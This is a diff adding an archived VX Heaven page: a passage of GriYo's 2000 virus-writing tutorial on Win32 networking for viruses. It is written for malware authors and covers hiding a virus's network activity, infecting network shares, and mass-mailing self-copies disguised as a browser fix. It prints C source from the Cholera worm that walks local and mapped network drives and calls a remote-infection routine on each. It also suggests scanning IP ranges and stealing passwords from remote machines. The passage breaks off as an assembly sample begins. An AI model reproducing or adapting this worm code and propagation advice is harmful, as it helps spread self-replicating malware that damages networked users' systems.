@@ -1,0 +1,811 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> GriYo 'Win32 Viral Networking Overwiew' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="GriYo"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, GriYo,Win32 Viral Networking Overwiew, socket, dword, error, server, addr, return, local, virus, push, include, type, program, connect, winsock, smtp"/>
+<meta name="Description" content="we will speak above several aspects of Win32 networking, but always centering in our viral desires."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"850e83582817fea635a449dd0f7a5e795e4b444c-1498757593-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vgy03.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Win32 Viral Networking Overwiew</h1><p><a href="/lib/?lang=en&amp;author=GriYo"> GriYo</a><br/> <em><a href="/vx.php?fid=8#f8">29a [4full]</a></em><br/> <em>March 2000</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vgy03.html';</script><div class="ci"><a href="/lib/?ci=vgy03">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=WI#vgy03">Back to index</a>] [<a href="/lib/vgy03.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#p1">Blocking</a></li>
+<li><a href="#p2">LAN</a></li>
+<li><a href="#p3">Internet</a>
+<ul>
+<li><a href="#p31">Electronic mail propagation</a></li>
+<li><a href="#p32">Electronic mail propagation with MAPI</a></li>
+<li><a href="#p33">Electronic mail propagation using our own SMTP engine</a></li>
+</ul></li>
+<li><a href="#p4">WINSOCK</a></li>
+<li><a href="#p5">Hooking networking APIs</a></li>
+<li><a href="#p6">Remote control</a></li>
+</ul>
+<p>I love VX ezines...</p>
+<p>The articles that deepen in a very concrete topic are my favorite ones, but usually i let them for later... There are some kind of articles that I like to read the first ones: Those which looks like a big compilation of technics and small tricks that always finish being useful.</p>
+<p>This article belongs to this group. we will speak above several aspects of Win32 networking, but always centering in our viral desires.</p>
+<h2><a name="p1">Blocking</a></h2>
+<p>We all know the typical operation of a virus: The virus receives the control instead of the program. The virus executes its actions to be became resident and/or to infect other files. The virus returns the execution to the program.</p>
+<p>All these actions made by the virus have to be carried out very quickly. Otherwise the user could notice that his system works in a different way: The programs take in being executed. Something makes the system to work slowly.</p>
+<p>Well, this it is the first problem. Some of the functions of those that we will speak require certain time to be done. Among these they are functions to connect with other computers, to send information...</p>
+<p>The most common ways of avoiding this are:</p>
+<ul>
+<li>Creating another process. The virus can drop a copy of itself inside a file with executable extension and later, to execute it. We put the calls to net functions inside the executable created by the virus. This way the execution of the infected program won't be hindered to have to wait for a net function to complete.
+<p>Advantages? If the program is executed without being noticed by the user the virus will remain resident until the session finishes. This requires to hide the executable in the task-list: Something trivial in Windows9x (using RegisterServiceProcess) but something complex in WindowsNt.</p>
+<p>Disadvantages? We have to create an executable one in disk. This requires to create its header, the sections that it consists and even maybe its icon. If we have to store all this inside the virus it will be better to start thinking on some compression method.</p></li>
+<li>Creating a thread. Something similar to the above mentioned, but instead of creating a process we create a new thread in the execution of the infected program.
+<p>Advantages? We don't have to create a file in disk. In consequence we don't have to store information inside the virus like the PE header of the executable.</p>
+<p>Disadvantages? The thread finished when the program that has thrown it finishes, and this can be in any moment. May be in the middle of some net operation.</p></li>
+</ul>
+<h2><a name="p2">LAN</a></h2>
+<p>Local area networks are like a cultivation of cells for a virus. Heaps of computers can be infected in question of... minutes? The idea is to take advantage of the interconnection capacity among the computers in order to be able to infect programs in remote.</p>
+<p>Some forms of taking finish this are:</p>
+<ul>
+<li>We can use the function GetLogicalDriveStrings, which fills a buffer with strings that specify valid drives in the system. If the user has mapped some remote drive into a local drive letter, it will appear in the chain returned by GetLogicalDriveStrings. We can use the function GetDriveType to determine the drive type on which we will work (local, remote, fixed-drive...).</li>
+<li>We can enumerate the drives the user is connected to although these they have not been mapped in a local drive letter. To do this we will need to use some APIs of MPR.DLL (WNetOpenEnum, WNetEnumResource and WNetCloseEnum).</li>
+</ul>
+<p>This part of iWorm.Cholera demostrates the above:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">long</span> WINAPI L0calThread<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> lParam<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> szLD<span style="color: black;">&#91;</span> <span style="color: #0000dd;">512</span><span style="color: black;">&#93;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>lpszDrive <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> size <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; lpszDrive <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>szLD<span style="color: black;">&#91;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">;</span> &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; size <span style="color: #339933;">=</span> GetLogicalDriveStringsA <span style="color: black;">&#40;</span> <span style="color: #0000dd;">512</span><span style="color: #339933;">,</span> lpszDrive<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> size <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;&amp;</span>amp<span style="color: #339933;">;</span> <span style="color: black;">&#40;</span> size <span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span> <span style="color: #0000dd;">512</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">*</span>lpszDrive <span style="color: #339933;">!=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: black;">&#41;</span> NULL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> GetDriveTypeA<span style="color: black;">&#40;</span> lpszDrive<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> DRIVE_FIXED<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span><span style="color: black;">&#40;</span> lpszDrive <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Rem0teInfecti0n<span style="color: black;">&#40;</span> lpszDrive<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lpszDrive <span style="color: #339933;">+=</span> <span style="color: #0000dd;">3</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> <span style="color: #339933;">*</span>lpszDrive <span style="color: #339933;">!=</span> <span style="color: black;">&#40;</span> <span style="color: #993333;">char</span><span style="color: black;">&#41;</span> NULL<span style="color: black;">&#41;</span> lpszDrive<span style="color: #339933;">++</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lpszDrive<span style="color: #339933;">++</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> Rem0teInfecti0n<span style="color: black;">&#40;</span> <span style="color: #ff0000;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #993333;">long</span> WINAPI Rem0teThread<span style="color: black;">&#40;</span><span style="color: #993333;">long</span> lParam<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> hMPR <span style="color: #339933;">=</span> LoadLibraryA <span style="color: black;">&#40;</span> szMPR_DLL<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span> &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a_WNetOpenEnum&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> FARPROC<span style="color: black;">&#41;</span> GetProcAddress <span style="color: black;">&#40;</span> hMPR<span style="color: #339933;">,</span> szWNetOpenEnumA<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a_WNetCloseEnum &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> FARPROC<span style="color: black;">&#41;</span> GetProcAddress <span style="color: black;">&#40;</span> hMPR<span style="color: #339933;">,</span> szWNetCloseEnum<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a_WNetEnumResource&nbsp; &nbsp; &nbsp; <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> FARPROC<span style="color: black;">&#41;</span> GetProcAddress <span style="color: black;">&#40;</span> hMPR<span style="color: #339933;">,</span> szWNetEnumResourceA<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> &nbsp; &nbsp;<span style="color: black;">&#40;</span> a_WNetOpenEnum <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span> &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;&amp;</span>amp<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> a_WNetCloseEnum <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;&amp;</span>amp<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span> a_WNetEnumResource <span style="color: #339933;">!=</span> NULL<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NetW0rming<span style="color: black;">&#40;</span> NULL<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FreeLibrary <span style="color: black;">&#40;</span> hMPR<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span> <span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+<br/>
+<span style="color: #993333;">void</span> NetW0rming<span style="color: black;">&#40;</span> LPNETRESOURCE lpnr<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; LPNETRESOURCE &nbsp; lpnrLocal <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; HANDLE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hEnum <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; count <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cEntries <span style="color: #339933;">=</span> <span style="color: #208080;">0xFFFFFFFF</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwResult <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; DWORD &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cbBuffer <span style="color: #339933;">=</span> <span style="color: #0000dd;">32768</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> a_WNetOpenEnum <span style="color: black;">&#40;</span> &nbsp; RESOURCE_CONNECTED<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RESOURCETYPE_ANY<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lpnr<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>hEnum<span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> NO_ERROR<span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lpnrLocal <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span> LPNETRESOURCE<span style="color: black;">&#41;</span> GlobalAlloc<span style="color: black;">&#40;</span> GPTR<span style="color: #339933;">,</span> cbBuffer<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwResult <span style="color: #339933;">=</span> a_WNetEnumResource<span style="color: black;">&#40;</span>&nbsp; hEnum<span style="color: #339933;">,</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>cEntries<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lpnrLocal<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>cbBuffer<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> dwResult <span style="color: #339933;">==</span> NO_ERROR<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span> count <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span> count <span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span> cEntries <span style="color: #339933;">;</span> count<span style="color: #339933;">++</span> <span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> lpnrLocal<span style="color: black;">&#91;</span> count<span style="color: black;">&#93;</span>.<span style="color: #202020;">dwUsage</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span> RESOURCEUSAGE_CONTAINER<span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NetW0rming<span style="color: black;">&#40;</span> <span style="color: #339933;">&amp;</span>amp<span style="color: #339933;">;</span>lpnrLocal<span style="color: black;">&#91;</span> count<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span> lpnrLocal<span style="color: black;">&#91;</span> count<span style="color: black;">&#93;</span>.<span style="color: #202020;">dwType</span> <span style="color: #339933;">=</span> RESOURCETYPE_DISK<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Rem0teInfecti0n<span style="color: black;">&#40;</span> lpnrLocal<span style="color: black;">&#91;</span> count<span style="color: black;">&#93;</span>.<span style="color: #202020;">lpRemoteName</span><span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>dwResult <span style="color: #339933;">!=</span> ERROR_NO_MORE_ITEMS<span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">break</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span> dwResult <span style="color: #339933;">!=</span> ERROR_NO_MORE_ITEMS<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; GlobalFree <span style="color: black;">&#40;</span> <span style="color: black;">&#40;</span> HGLOBAL<span style="color: black;">&#41;</span> lpnrLocal<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; a_WNetCloseEnum<span style="color: black;">&#40;</span> hEnum<span style="color: black;">&#41;</span> <span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>Let the imagination to fly. You will find tons of ways to *exploit* the interconnection among computers in a LAN:</p>
+<ul>
+<li>To scan a certain range of IPs inside the net in search of certain services (netbios, ftp or any other way to get access to a remote system).</li>
+<li>Communication among viruses that reside in different systems... maybe to be able to map the net, or even to be able to disable all the viruses inside the LAN (escape technique).</li>
+<li>Something that is not new: To steal passwords or other information present on remote systems.</li>
+</ul>
+<h2><a name="p3">Internet</a></h2>
+<p>Internet is for a virus like a big LAN, with an advantage: The remote systemas can be in very distant geographical areas. This allows the virus to travel quickly all over the world.</p>
+<p>Lets see several propagation techniques that are applied to internet...</p>
+<h3><a name="p31">Electronic mail propagation</a></h3>
+<p>If we want our virus to be able to send copies of itself by electronic mail we will need:</p>
+<ul>
+<li>A way to build the email messages and to make them arrive to the server.</li>
+<li>Mail addresses where to send the virus.</li>
+<li>To make that the message seems real, not generated.</li>
+</ul>
+<p>Step by step. To build electronic mail message we can:</p>
+<ul>
+<li>Trust in some system service so that it generates and send the message for us. We can use MAPI that is quite simple, but not very stealthy.</li>
+<li>to implement code to carry out the generation and delivery of the message. This may involve to write code to implement SMTP protocol, MIME and BASE64.</li>
+</ul>
+<h3><a name="p32">Electronic mail propagation with MAPI</a></h3>
+<p>MAPI is the easy way for generating mail. You can use MAPI32.DLL and functions like MAPILogOn, MAPISendMail, MAPISendDocuments, etc...</p>
+<p>To see how simple it is, lets look at this sample code. It looks at the messages in your INBOX folder to get email addresses. Then it generates a message which carries a copy of itself under the name MSIE5FIX.EXE</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>386P<br/>
